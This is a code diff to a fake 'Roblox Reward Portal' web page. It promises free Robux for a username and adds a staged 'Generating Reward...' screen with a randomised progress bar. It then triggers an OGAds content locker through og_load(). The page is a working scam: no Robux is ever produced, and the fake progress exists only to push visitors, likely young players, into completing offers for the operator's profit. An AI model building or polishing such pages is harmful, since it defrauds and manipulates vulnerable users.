@@ -17,8 +17,8 @@
     
     <!-- STEP 1: Account Connection -->
     <div id="step1" class="step active">
-      <h1 class="hero-title">ROBLOX REWARDS HUB</h1>
-      <p class="hero-subtitle">Enter your username to begin the secure transfer</p>
+      <h1 class="hero-title">ROBLOX REWARD PORTAL</h1>
+      <p class="hero-subtitle">Claim your Robux reward securely</p>
       
       <div class="input-wrapper">
         <input 
@@ -77,6 +77,22 @@
           <div class="robux-icon">👑</div>
           <div class="robux-amount">22,500</div>
           <div class="robux-label">Robux</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3.5: Generating Reward (NEW) -->
+    <div id="step3-5" class="step" style="display: none;">
+      <div class="generating-container">
+        <div class="spinner-large"></div>
+        <h2 class="generating-title">Generating Reward...</h2>
+        <p class="generating-subtitle">Generating <span id="generating-amount"></span> Robux for @<span id="generating-username"></span></p>
+        
+        <div class="fast-progress-container">
+          <div class="fast-progress-bar">
+            <div class="fast-progress-fill" id="fast-progress-fill"></div>
+          </div>
+          <p class="fast-progress-text" id="fast-progress-text">0%</p>
         </div>
       </div>
     </div>
@@ -153,33 +169,63 @@ function startScanningAnimation() {
 function selectReward(amount) {
   selectedAmount = amount;
   
-  // Update dynamic text
-  document.getElementById('selected-amount').textContent = amount.toLocaleString();
-  document.getElementById('final-username').textContent = selectedUsername;
+  // Update generating screen text
+  document.getElementById('generating-amount').textContent = amount.toLocaleString();
+  document.getElementById('generating-username').textContent = selectedUsername;
   
-  // Transition to Step 4
-  const step4Div = document.getElementById('step4');
-  transitionToStep('step4');
+  // Transition to Step 3.5 (Generating screen)
+  transitionToStep('step3-5');
   
-  // Show Step 4 and trigger OGAds locker immediately
-  setTimeout(() => {
-    step4Div.style.display = 'block';
+  // Start fast progress animation
+  startGeneratingAnimation();
+}
+
+function startGeneratingAnimation() {
+  const progressFill = document.getElementById('fast-progress-fill');
+  const progressText = document.getElementById('fast-progress-text');
+  let progress = 0;
+  
+  const interval = setInterval(() => {
+    progress += Math.random() * 15 + 10; // Random increment between 10-25
+    if (progress > 100) progress = 100;
     
-    console.log('Step 4 visible');
-    console.log('og_load available:', typeof og_load);
+    progressFill.style.width = progress + '%';
+    progressText.textContent = Math.floor(progress) + '%';
     
-    if (typeof og_load === 'function') {
-      console.log('Executing og_load()...');
-      try {
-        og_load();
-        console.log('og_load() executed successfully');
-      } catch (error) {
-        console.error('Error executing og_load:', error);
-      }
-    } else {
-      console.error('og_load not available!');
+    if (progress >= 100) {
+      clearInterval(interval);
+      
+      // After 2.5 seconds total, move to Step 4 and trigger locker
+      setTimeout(() => {
+        // Update final verification text
+        document.getElementById('selected-amount').textContent = selectedAmount.toLocaleString();
+        document.getElementById('final-username').textContent = selectedUsername;
+        
+        const step4Div = document.getElementById('step4');
+        transitionToStep('step4');
+        
+        // Show Step 4 and trigger OGAds locker
+        setTimeout(() => {
+          step4Div.style.display = 'block';
+          
+          console.log('Step 4 visible - triggering locker');
+          console.log('og_load available:', typeof og_load);
+          
+          if (typeof og_load === 'function') {
+            console.log('Executing og_load()...');
+            try {
+              og_load();
+              console.log('og_load() executed successfully');
+            } catch (error) {
+              console.error('Error executing og_load:', error);
+            }
+          } else {
+            console.error('og_load not available!');
+          }
+        }, 100);
+      }, 300);
     }
-  }, 100);
+  }, 100); // Update every 100ms for smooth animation (~2.5 seconds total)
 }
 
 function transitionToStep(stepId) {
